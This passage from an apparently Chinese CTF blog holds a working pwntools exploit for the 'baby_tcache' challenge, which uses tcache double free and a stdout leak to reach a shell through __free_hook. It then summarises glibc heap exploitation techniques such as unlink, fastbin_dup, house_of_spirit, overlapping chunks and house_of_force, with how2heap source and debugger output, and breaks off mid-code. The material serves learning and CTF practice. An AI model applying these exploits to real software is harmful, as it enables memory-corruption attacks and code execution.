offbyOne构造overlapping chunk，往tcache中的chunk写入 main_arena + 88。然后利用double free，partial overwrite fd指针的后两位，使tcache中chunk的fd指针指向stdout。最后分配到包含stdout的chunk，就可以修改stdout结构体了。这个partial overwrite需要爆破，日常非洲人，爆破到怀疑人生。通过stdout结构体泄露出libc地址后就是常规做法了，利用tcache_dup 往__free_hook 中写入one_gadget来getshell。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import*#context.log_level = "debug"context.terminal =["tmux","splitw","-h"]#p = process('./baby_tcache')def new(content,size): p.recvuntil("Your choice: ") p.sendline('1') p.recvuntil("Size:") p.sendline(str(size)) p.recvuntil("Data:") p.send(content) def delete(idx): p.recvuntil("Your choice: ") p.sendline('2') p.recv() p.sendline(str(idx))def exp(): new("aaaa",0x410)#0 new("cccc",0x70)#1 new("dddd",0x5f0)#2 new("eeee",0x30)#3 delete(0) delete(1) new("a"*0x70 + p64(0x420+0x80),0x78) #0 delete(2)# trigger delete(0) new("aaaa",0x410)#0 new('\x20\xb7',0x88)#1 change tcache-&gt;fd to stdout new('a',0x78)#2 fake_file = p64(0xfbad1800) + p64(0)*3 + "\x00" new(fake_file,0x78)#4 data = p.recv(0x20) leak = u64(data[0x18:]) #0x7f0000000000 if leak&amp;0x7f0000000000==0x7f0000000000: #判断是否成功修改stdout,泄露出地址 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') log.info("leak_add ==&gt; &#123;&#125;".format(hex(leak))) libc_base = leak - libc.symbols['_IO_file_jumps'] libc.address = libc_base free_hook = libc.symbols['__free_hook'] one_gadget = 0xfccde + libc_base log.info("libc_base ==&gt; &#123;&#125;".format(hex(libc_base))) delete(1) delete(2) #tcache_dup new(p64(free_hook),0x88) new('\n',0x88) new(p64(one_gadget),0x88) delete(3) p.interactive() else: p.close() if __name__ == '__main__': while True: try: p = process('./baby_tcache') exp() except Exception as e: p.close() continue]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用的一些总结]]></title>
    <url>%2F2019%2F03%2F08%2F2018-9-30-%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近闲来无事，就把学过的堆的利用总结一下。这里只是总结一下利用的思路，基础知识就不讲了，可能会贴上些glibc的源码。 一些学习网站CTF-WIKI入门网站 CTF-ALL-IN-ONE对堆的利用的原理讲的很清楚 Heap Exploitation国外作者写的，感觉还行 source code of malloc.c在线阅读glibc的源码，很方便 UAFUAF也就是use after free，这种情况的产生是因为free掉了chunk后没有将它的指针置为空。所以在被free掉后还可以被使用。 用处： 泄露信息，比如说泄露libc的地址 与fastbins attack结合，分配到包含想要控制的地址的chunk 进行unsortedbin attack，向一个地址内写入一个很大的值 unsafe unlinkunlink的目的：把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。这实际上是对chunk的fd和bk指针的操作，fd_nextsize和bk_nextsize只有在chunk是large bins chunk时才会用到，而一般情况下很少用到。 unlink攻击的前提条件： 程序必须有某个地方存储着malloc返回的chunk地址，例如bss段中存放chunk地址的全局数组变量 unsafe_unlink攻击的本质，是对fd和bk这两个指针的利用123456789101112131415FD = P-&gt;fd; BK = P-&gt;bk; FD-&gt;bk = BK; BK-&gt;fd = FD; 因为unlink会有一个check,检查chunk的fd和bk是否被恶意修改了，所以为了绕过检查FD和BK只能修改成特定的值，假设ptr上存储着P的地址 (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))64位下FD = ptr - 0x18BK = ptr- 0x10unlink实际做了*(ptr - 0x18 + 0x18) = ptr - 0x10*(ptr - 0x10 - 0x10) = ptr - 0x18 #主要看这步等价于*ptr = ptr - 0x18 通过unlink攻击可以控制 并修改指向chunk的指针，如果程序有往chunk中写的操作，那么就可以借此实现任意地址写 PWN中的unlink 攻击主要分两种： 向前合并的unlink(这里的前是指高地址的chunk) 向后合并的unlink(这里的后是指低地址的chunk)这两者要构造的chunk有点不一样下面一律假设 free掉的chunk为P，存储着P地址的地址 为ptr 向后合并源码：123456if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; 根据P的size字段的flag位，判断前一个chunk是否正在使用 如果前一个chunk是free状态，修改size大小 修改指向P的指针，改为指向前一个chunk 利用unlink将前一个chunk从bins链表中移除这里构造的话要在前一个chunk中伪造一个fake_chunk,fake_chunk的fd和bk指针要为特定值， 同时通过存在的漏洞控制当前chunk的prev_size字段和size字段，使其prev_size的大小的 fake_chunk的大小，size字段中的prev_inuse标志位为0构造的payload 123456789//假设 前一个chunk的大小为0xa0, P的大小为0x9064位的fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,'a')32位的fake_chunk = p32(0) + p32(0x90) + p32(ptr- 0x10) + p32(ptr - 0x8)fake_chunk = fake_chunk.ljust(0x90,'a')同时要修改P的prev_size为 0x90，size字段为0x90，使prev_inuse为0最后free掉P就可以触发unlink了 2.向前合并源码： 1234567891011 if (nextchunk != av-&gt;top) &#123; /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize);/*这里检查下下个chunk的flag标志位*/ /* consolidate forward */ if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd); size += nextsize; &#125;#define inuse_bit_at_offset(p, s)\ (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE) 检查下下个chunk的prev_inuse标志位 如果prev_inuse为0，就进行unlink，将P从链表中取出 然后修改P的size字段这里利用要构造的chunk和向后合并不一样，它要能控制P的下下个chunk的size字段 上面的图是一个64位的简单的例子，chunk1已经设置好了fd和bk，此时只要free掉chunk0，就会检查是否可以向前合并，通过检查chunk0的下下个chunk的prev_inuse标志位，也就是chunk2的，这里chunk2的prev_ inuse已经被我设置为0了，这时就会进行向前合并，通过unlink宏将chunk1从链表中取出来。 大致的就是上面所说的，不过实际上会复杂很多。下面贴上unlink源码unlink源码： 12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) &#123; if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) /*检查chunk的size字段*/ malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))/*检查chunk的fd 和bk是否正确，这里也是unlink要绕过的地方*/ malloc_printerr ("corrupted double-linked list"); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; if (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr ("corrupted double-linked list (not small)"); if (FD-&gt;fd_nextsize == NULL) &#123; if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; top_chunktopchunk简单的玩法就是house_of_force，分配出包含想要控制的地址的chunk，一般来说用来修改got表的内容，或者是修改_malloc_hook或者free_hook的内容。还有一种玩法就是往特定的地址写入特定的值，这个和topchunk的分配机制有关。 详情参考我这篇博客 how2heap系列—————————–2019.3.8更新 最近在整理自己的知识体系，读了一下malloc的源码，顺便看了下how2heap上的利用例子。在这篇堆总结中记录一下。建议学习how2heap系列时，可以编译带调试信息的可执行文件，这样比较方便调试。其中一些的源码，我删除了一些没用的输出，精简了一下。 fastbin_dup源码 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n"); fprintf(stderr, "Allocating 3 buffers.\n"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, "1st malloc(8): %p\n", a); fprintf(stderr, "2nd malloc(8): %p\n", b); fprintf(stderr, "3rd malloc(8): %p\n", c); fprintf(stderr, "Freeing the first one...\n"); free(a); fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a); // free(a); fprintf(stderr, "So, instead, we'll free %p.\n", b); free(b); fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a); free(a); fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a); fprintf(stderr, "1st malloc(8): %p\n", malloc(8)); fprintf(stderr, "2nd malloc(8): %p\n", malloc(8)); fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));&#125; 这个例子主要是展示了fastbin的Double free，这个指的是fastbin中chunk可以被free多次，所以可以在fastbin链表中存在多次。导致了多次分配可以从fastbin中取出同一块chunk。 这个能成功的原因： 放入fastbins中的chunk对应的nextChunk 的prev_inuse标志位没有清空 fastbin在执行free时只验证了fasttop的chunk，对后面的chunk没有进行检查 运行结果 1234567891011121314☁ how2heap [master] ⚡ ./fastbin_dup This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0xc010102nd malloc(8): 0xc010303rd malloc(8): 0xc01050Freeing the first one...If we free 0xc01010 again, things will crash because 0xc01010 is at the top of the free list.So, instead, we&apos;ll free 0xc01030.Now, we can free 0xc01010 again, since it&apos;s not the head of the free list.Now the free list has [ 0xc01010, 0xc01030, 0xc01010 ]. If we malloc 3 times, we&apos;ll get 0xc01010 twice!1st malloc(8): 0xc010102nd malloc(8): 0xc010303rd malloc(8): 0xc01010 fastbin_dup_consolidate源码 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123; void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2); fprintf(stderr, "Now free p1!\n"); free(p1); void* p3 = malloc(0x400); fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3); fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n"); free(p1); fprintf(stderr, "Trigger the double free vulnerability!\n"); fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n"); fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));&#125; 这个主要是展示了一下利用malloc_consolidate函数来进行Double free。 当在fastbin 中不存在满足分配需求的chunk时，会执行malloc_consolidate函数，这个函数主要的功能是将fastbin中的chunk拿出来，检查它们物理相邻的chunk是否处于free状态，如果处于就合并，然后将合并后的chunk放入unsortedbin中，如果是与topchunk相邻，就直接和top_chunk合并。 运行结果: 12345678☁ glibc_2.25 [master] ⚡ ./fastbin_dup_consolidate Allocated two fastbins: p1=0x993010 p2=0x993060Now free p1!Allocated large bin to trigger malloc_consolidate(): p3=0x9930b0In malloc_consolidate(), p1 is moved to the unsorted bin.Trigger the double free vulnerability!We can pass the check in malloc() since p1 is not fast top.Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x993010 0x993010 简单分析下流程 先分配两个大小为0x40的chunkp1、p2，然后将p1 free掉， p1会被放入fastbins中 1234567891011121314pwndbg&gt; heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x602000 --&gt; 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6020a0 (size : 0x20f60) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 然后分配一个0x400大小的chunk，这时没有满足这个大小的chunk，所以会执行malloc_consolidate函数，将fastbin中的chunk 合并（这里是指和物理相邻的并且处于free状态的chunk合并），然后再放入unsorted bin中 ，所以p1会从fastbin中转移到unsortedbin中。然后分配器再检查bins中是否有符合的chunk，如果没有，就将unsortedbin中的chunk放入对应的bin中，这里p1被放入了smallbin[0x50] 123pwndbg&gt; smallbins smallbins0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8 然后再free掉p1就不会触发doublefree 了，因为这时p1不在fastbin的头部。最后连续分配两次0x40大小的chunk，就可以取出两次p1。 fastbin_dup_into_stack源码 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; unsigned long long stack_var; fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&amp;stack_var); fprintf(stderr, "Allocating 3 buffers.\n"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, "1st malloc(8): %p\n", a); fprintf(stderr, "2nd malloc(8): %p\n", b); fprintf(stderr, "3rd malloc(8): %p\n", c); fprintf(stderr, "Start double free a\n"); free(a);//double free a free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, "1st malloc(8): %p\n", d); fprintf(stderr, "2nd malloc(8): %p\n", malloc(8)); fprintf(stderr, "Now the free list has [ %p ].\n", a); fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n" "so now we are writing a fake free size (in this case, 0x20) to the stack,\n" "so that malloc will think there is a free chunk there and agree to\n" "return a pointer to it.\n", a); stack_var = 0x20;//set size fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); fprintf(stderr, "4th malloc(8): %p\n", malloc(8));&#125; 这个例子展示了怎么利用fastbin的Double free来分配得到位于stack的chunk。核心是控制fasbtin chunk的fd指针，将它指向stack，同时stack上要有满足大小的size值。实际上可以利用这实现分配任意地址，只要知道地址，并且地址上存在满足相应fastbin大小的size值。 先Double free 123456789pwndbg&gt; fastbins fastbins0x20: 0x602000 —▸ 0x602020 ◂— 0x6020000x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0 修改fastbins chunk的fd指针为stack_add，那么fastbins链表就会指向stack_chunk 123456789pwndbg&gt; fastbins fastbins0x20: 0x602000 —▸ 0x7fffffffdd08 —▸ 0x602010 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0 最后分配到stack的内存 1234567891011121314151617☁ glibc_2.25 [master] ⚡ ./fastbin_dup_into_stack The address we want malloc() to return is 0x7ffe3a30b948.Allocating 3 buffers.1st malloc(8): 0x8ef0102nd malloc(8): 0x8ef0303rd malloc(8): 0x8ef050Start double free a1st malloc(8): 0x8ef0102nd malloc(8): 0x8ef030Now the free list has [ 0x8ef010 ].Now, we have access to 0x8ef010 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x8ef010 to point right before the 0x20.3rd malloc(8): 0x8ef010, putting the stack address on the free list4th malloc(8): 0x7ffe3a30b948 house_of_spirit源码 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n"); malloc(1); fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"); fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]); fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"); a = &amp;fake_chunks[2]; fprintf(stderr, "Freeing the overwritten pointer.\n"); free(a); fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));&#125; 这个技术核心是在目标地址伪造fake_chunk，然后将释放。最终可以实现分配指定地址的目的。要注意的是要伪造fake_chunk的nextchunk，使其size字段的prev_inuse为0x1。 其中伪造的fake_chunk要满足一些条件 fake_chunk的地址需要对齐 fake_chunk的IS_MMAPPED位不能置为1，不然在被free时会被当作mmap的chunk处理 fake_chunk的size大小要满足对应的fastbin的大小 fake_chunk的next_chunk大小要大于2*SIZE_SZ，同时小于av-&gt;system_mem (128kb) 查看伪造的fake_chunk以及 next_chunk 123456789101112131415161718pwndbg&gt; p fake_chunks $4 = &#123;0x0, 0x40, 0xff0000000000, 0x0, 0x1, 0x4008cd, 0x0, 0x0, 0x400880, 0x1234&#125;pwndbg&gt; p &amp;fake_chunks $3 = (unsigned long long (*)[10]) 0x7fffffffdcf0pwndbg&gt; chunkinfo 0x7fffffffdcf0================================== Chunk info ==================================Status : Freed Unlinkable : False (FD or BK is corruption) Freeable : Trueprev_size : 0x0 size : 0x40 prev_inused : 0 is_mmap : 0 non_mainarea : 0 fd : 0xff0000000000 bk : 0x0 运行结果 123456789101112☁ glibc_2.25 [master] ⚡ ./house_of_spirit Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffc6d557388 and the second at 0x7ffc6d5573c8.This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffc6d557388.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffc6d557388, which will be 0x7ffc6d557390!malloc(0x30): 0x7ffc6d557390 overlapping_chunks源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int main(int argc , char* argv[])&#123; intptr_t *p1,*p2,*p3,*p4; fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n"); fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n"); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3); memset(p1, '1', 0x100 - 8); memset(p2, '2', 0x100 - 8); memset(p3, '3', 0x80 - 8); free(p2); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2 p4 = malloc(evil_region_size); fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size); fprintf(stderr, "Let's run through an example. Right now, we have:\n"); fprintf(stderr, "p4 = %s\n", (char *)p4); fprintf(stderr, "p3 = %s\n", (char *)p3); fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size); memset(p4, '4', evil_region_size); fprintf(stderr, "p4 = %s\n", (char *)p4); fprintf(stderr, "p3 = %s\n", (char *)p3); fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n"); memset(p3, '3', 80); fprintf(stderr, "p4 = %s\n", (char *)p4); fprintf(stderr, "p3 = %s\n", (char *)p3);&#125; 这个是一个简单的overlapping_chunk的例子，它通过修改被free掉的chunk_p2的size字段，使其增大，大小为p2_size + p3_size 。然后再malloc 相应大小的chunk_p4，就可以通过chunk_p4控制 chunk_p3的内容。这个 evil_chunk_size需要注意下它的标志位，尽量保持堆的稳定性。 调试一下： 修改size前 12345678910111213141516171819202122232425262728293031pwndbg&gt; heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x603280 (size : 0x20d80) last_remainder: 0x0 (size : 0x0) unsortbin: 0x603100 (size : 0x100)pwndbg&gt; chunkinfo 0x603100================================== Chunk info ==================================Status : Freed Unlinkable : TrueResult of unlink : FD-&gt;bk (*0x7ffff7dd1b90) = BK (0x603100 -&gt; 0x7ffff7dd1b78) BK-&gt;fd (*0x7ffff7dd1b88) = FD (0x603100 -&gt; 0x7ffff7dd1b78) Freeable : false -&gt; Double free chunkaddr(0x603100) inused bit is not seted )prev_size : 0x3131313131313131 size : 0x100 prev_inused : 1 is_mmap : 0 non_mainarea : 0 fd : 0x7ffff7dd1b78 bk : 0x7ffff7dd1b78 修改p2的size字段 123456780x602100 PREV_INUSE &#123; prev_size = 0x3131313131313131, size = 0x181, fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, fd_nextsize = 0x3232323232323232, bk_nextsize = 0x3232323232323232&#125; 通过p2修改p3的内容，输出结果 12345678910111213141516171819202122☁ glibc_2.25 [master] ⚡ ./overlapping_chunks This is a simple chunks overlapping problemLet&apos;s start to allocate 3 chunks on the heapThe 3 chunks have been allocated here:p1=0x9af010p2=0x9af110p3=0x9af210p4 has been allocated at 0x9af110 and ends at 0x9af288Let&apos;s run through an example. Right now, we have:p4 = xۦ��3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�If we memset(p4, &apos;4&apos;, 376), we have:p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�And if we then memset(p3, &apos;3&apos;, 80), we have:p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444� overlapping_chunks_2源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6,fake_size; int prev_in_use = 0x1; fprintf(stderr, "\nThis is a simple chunks overlapping problem"); fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"); fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:"); p1 = malloc(1000);//0x3e8 actually chunk_size ==&gt; 0x3f0 p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, "\nchunk p2 from %p to %p", p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, "\nchunk p3 from %p to %p", p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, "\nchunk p5 from %p to %p\n", p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,'A',real_size_p1); memset(p2,'B',real_size_p2); memset(p3,'C',real_size_p3); memset(p4,'D',real_size_p4); memset(p5,'E',real_size_p5); fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); free(p4); fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"); fake_size = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; fprintf(stderr,"\n fake_size ==&gt; %x \n",fake_size); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE /*fake_size = real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size*/ fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"); fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n"); free(p2); fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"); fprintf(stderr, "\nchunk p6 from %p to %p", p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); fprintf(stderr, "\nData inside chunk p3: \n\n"); fprintf(stderr, "%s\n",(char *)p3); fprintf(stderr, "\nLet's write something inside p6\n"); memset(p6,'F',1500); fprintf(stderr, "\nData inside chunk p3: \n\n"); fprintf(stderr, "%s\n",(char *)p3); &#125; 这个也是overlapping_chunk的例子，不过它造成overlapping是在free前完成的，也就是释放一个size字段被修改后的chunk，这个修改后的chunk会将它之后的chunk给包括进去。 修改p2的size字段，大小为real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size 修改前： 修改后 将p2 释放掉,再申请一个大小为2000的chunk，就可以返回p2，通过p2就可以控制p3的内容了 运行结果 house_of_force源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;char bss_var[] = "This is a string that we want to overwrite.";int main(int argc , char* argv[])&#123; fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n"); fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var); fprintf(stderr, "Its current value is: %s\n", bss_var); fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n"); intptr_t *p1 = malloc(256); fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - sizeof(long)*2); fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n"); int real_size = malloc_usable_size(p1); fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top); fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n"); fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + 